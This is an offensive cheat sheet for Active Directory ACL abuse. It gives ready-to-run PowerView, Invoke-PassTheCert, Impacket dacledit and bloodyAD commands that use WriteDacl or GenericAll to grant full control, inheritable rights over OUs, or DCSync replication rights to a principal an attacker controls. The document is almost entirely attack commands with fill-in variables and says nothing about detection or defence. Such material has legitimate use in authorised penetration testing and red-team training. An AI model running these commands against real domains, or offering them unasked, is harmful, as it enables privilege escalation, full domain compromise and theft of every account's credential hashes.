---
technique: GrantRights
category: acl-abuse
ace: WriteDacl, GenericAll
targets: User, Group, Computer, Domain, OU
protocols: LDAP, LDAPS
remote_capable: true
tags: acl-abuse dacl ad writedacl full-control dcsync ldap
---

# GrantRights

When a controlled object holds `WriteDacl` or `GenericAll` over another object, the attacker can write new ACEs into that object's DACL. The most common abuses are granting `GenericAll` (full control) or granting `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` to a controlled principal, enabling DCSync against the domain. If `WriteDacl` targets a container or OU, adding inheritance flags causes the ACE to flow down to all child objects with `AdminCount=0`.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| WriteDacl | Write access to the target object's DACL |
| GenericAll | Full control, implicitly includes WriteDacl |

## Windows

PowerView is the primary tool. Invoke-PassTheCert provides certificate-based auth for more granular ACE writes.

### Grant FullControl (PowerView)

#powershell #powerview

Grant full control over a target object to a controlled principal using PowerView.

```powershell title:"Grant FullControl ACE via PowerView"
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "$target_object" -PrincipalIdentity "$controlled_object"
```
<!-- cheat
var target_object
var controlled_object
-->

### Grant DCSync (PowerView)

#powershell #powerview

Grant DCSync replication rights over the domain object to a controlled principal using PowerView.

```powershell title:"Grant DCSync ACE via PowerView"
Add-DomainObjectAcl -Rights 'DCSync' -TargetIdentity "$target_object" -PrincipalIdentity "$controlled_object"
```
<!-- cheat
var target_object
var controlled_object
-->

### Step 1: Import module for GenericAll (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection for GenericAll (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Grant GenericAll over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Grant GenericAll access over a target object using a certificate via Invoke-PassTheCert.

```powershell title:"Grant GenericAll ACE over LDAPS using certificate"
Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $ldap -Identity "$controlled_user_dn" -Target "$target_object_dn" -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'
```
<!-- cheat
var controlled_user_dn
var target_object_dn
var ldap
-->

### Step 4: Import module for DCSync (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 5: Get LDAP connection for DCSync (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 6: Grant DCSync over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Grant DCSync replication rights over the domain object using a certificate via Invoke-PassTheCert.

```powershell title:"Grant DCSync ACE over LDAPS using certificate"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'DCSync' -Identity "$controlled_user_dn" -Target "$domain_dn"
```
<!-- cheat
var controlled_user_dn
var domain_dn
var ldap
-->

## Linux

Impacket's dacledit and bloodyAD both write directly to the DACL over LDAP.

### Grant FullControl (dacledit)

#ldap #password #impacket

Write a FullControl ACE to a target object's DACL using Impacket's dacledit.

```sh title:"Write FullControl ACE via dacledit"
dacledit.py -action 'write' -rights 'FullControl' -principal "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->

### Grant DCSync (dacledit)

#ldap #password #impacket

Write a DCSync ACE to the domain object's DACL using Impacket's dacledit.

```sh title:"Write DCSync ACE via dacledit"
dacledit.py -action 'write' -rights 'DCSync' -principal "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->

### Grant FullControl with inheritance (dacledit)

#ldap #password #impacket

Write an inheritable FullControl ACE to a container or OU's DACL using Impacket's dacledit to propagate rights to child objects.

```sh title:"Write inheritable FullControl ACE via dacledit"
dacledit.py -action 'write' -rights 'FullControl' -principal "$controlled_object" -target-dn "$target_dn" -inheritance "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_dn
-->

### Grant GenericAll (bloodyAD)

#ldap #multi-auth

Grant GenericAll rights over a target object to a controlled principal using bloodyAD.

```sh title:"Grant GenericAll via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags add genericAll "$target_object" "$controlled_object"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_object
var controlled_object
-->

### Grant DCSync (bloodyAD)

#ldap #multi-auth

Grant DCSync replication rights to a controlled principal using bloodyAD.

```sh title:"Grant DCSync via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags add dcsync "$controlled_object"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var controlled_object
-->
